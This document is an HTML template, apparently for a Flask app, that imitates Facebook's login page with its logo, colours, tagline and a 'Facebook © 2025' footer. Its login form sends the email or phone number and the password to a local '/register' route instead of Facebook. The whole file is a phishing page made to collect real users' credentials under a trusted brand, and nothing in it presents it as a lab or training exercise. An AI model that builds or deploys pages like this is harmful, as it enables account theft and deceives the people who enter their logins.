<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <link rel="icon" type="image/png" href="{{ url_for('static', filename='logo.png') }}">
  <style>
    body {
      font-family: Helvetica, Arial, sans-serif;
      background-color: #f0f2f5;
      margin: 0;
      padding: 0;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      gap: 80px;
      flex-wrap: wrap;
      padding: 20px;
      box-sizing: border-box;
    }

    /* === LEFT SECTION === */
    .left-section {
      flex: 1 1 350px;
      max-width: 420px;
      text-align: left;
    }

    .left-section h1 {
      color: #1877f2;
      font-size: 56px;
      margin-bottom: 10px;
    }

    .left-section p {
      font-size: 20px;
      color: #1c1e21;
      line-height: 1.5;
    }

    /* === RIGHT SECTION === */
    .login-box {
      background: #fff;
      padding: 20px 20px 30px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
      width: 380px;
      max-width: 100%;
      text-align: center;
      flex-shrink: 0;
    }

    input[type="text"],
    input[type="password"] {
      width: 90%;
      padding: 14px;
      margin: 10px 0;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 16px;
      outline: none;
      box-sizing: border-box;
    }

    input:focus {
      border-color: #1877f2;
      box-shadow: 0 0 2px #1877f2;
    }

    button {
      background-color: #1877f2;
      color: #fff;
      font-weight: bold;
      border: none;
      padding: 14px;
      border-radius: 6px;
      cursor: pointer;
      width: 95%;
      font-size: 18px;
      margin-top: 10px;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #166fe5;
    }

    .forgot-link {
      display: block;
      color: #1877f2;
      font-size: 14px;
      margin: 15px 0;
      text-decoration: none;
    }

    .forgot-link:hover {
      text-decoration: underline;
    }

    .divider {
      border-top: 1px solid #dddfe2;
      margin: 15px 0;
    }

    .create-btn {
      background-color: #42b72a;
      color: #fff;
      font-weight: bold;
      border: none;
      padding: 14px;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
      width: 60%;
      transition: background-color 0.3s ease;
    }

    .create-btn:hover {
      background-color: #36a420;
    }

    .footer {
      text-align: center;
      padding: 20px;
      font-size: 12px;
      color: #606770;
    }

    /* === RESPONSIVE DESIGN === */
    @media (max-width: 900px) {
      .container {
        flex-direction: column;
        text-align: center;
        gap: 20px;
        height: auto;
      }

      .left-section {
        text-align: center;
        margin-bottom: 20px;
      }

      .left-section h1 {
        font-size: 48px;
      }

      .left-section p {
        font-size: 18px;
      }

      .login-box {
        width: 100%;
        max-width: 400px;
      }
    }

    @media (max-width: 480px) {
      .left-section h1 {
        font-size: 40px;
      }

      .left-section p {
        font-size: 16px;
      }

      .login-box {
        padding: 20px;
      }

      input[type="text"],
      input[type="password"] {
        width: 100%;
        padding: 12px;
        font-size: 14px;
      }

      button, .create-btn {
        font-size: 15px;
        padding: 12px;
      }

      .create-btn {
        width: 100%;
      }

      .forgot-link {
        font-size: 13px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Left side -->
    <div class="left-section">
      <h1>facebook</h1>
      <p>Connect with friends and the world around you on Facebook.</p>
    </div>

    <!-- Right side -->
    <div class="login-box">
      <form method="POST" action="/register">
        <input type="text" name="username" placeholder="Email or phone number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
      </form>

      <a href="#" class="forgot-link">Forgotten password?</a>
      
      <div class="divider"></div>
      <a href="/register"><button class="create-btn">Create New Account</button></a>
    </div>
  </div>

  <div class="footer">
    <p>Facebook Â© 2025</p>
  </div>
</body>
</html>
